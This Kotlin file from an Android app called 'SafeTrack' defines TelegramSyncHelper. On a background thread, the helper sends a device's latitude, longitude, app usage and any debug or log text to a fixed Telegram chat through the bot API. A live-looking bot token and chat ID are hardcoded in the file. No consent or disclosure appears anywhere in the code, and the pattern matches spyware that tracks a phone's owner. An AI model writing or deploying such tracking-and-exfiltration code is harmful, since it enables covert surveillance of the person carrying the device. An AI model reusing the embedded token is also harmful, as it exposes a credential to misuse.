package com.example.safetrack

import android.util.Log
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import kotlin.concurrent.thread

object TelegramSyncHelper {
    fun sendToTelegram(lat: String, lng: String, usageApp: String) {
        val message = "🚨 *SafeTrack Alert*\n\n📍 *Location:* $lat, $lng\n📱 *App Usage:* $usageApp"
        sendMessage(message)
    }

    fun sendDebugLog(message: String) {
        sendMessage(message)
    }

    fun sendLogData(message: String) {
        sendMessage(message)
    }

    private fun sendMessage(message: String) {
        thread {
            try {
                val botToken = "8961320031:AAGWyCdW9CziarfEF8p3ynltYOsMWUirxNw"
                val chatId = "8720835777"
                val encodedText = URLEncoder.encode(message, "UTF-8")
                val urlString = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$encodedText&parse_mode=Markdown"

                val url = URL(urlString)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.connect()

                val responseCode = connection.responseCode
                Log.d("TelegramSyncHelper", "Telegram API response: $responseCode")

                connection.disconnect()
            } catch (e: Exception) {
                Log.e("TelegramSyncHelper", "Error sending to Telegram", e)
            }
        }
    }
}
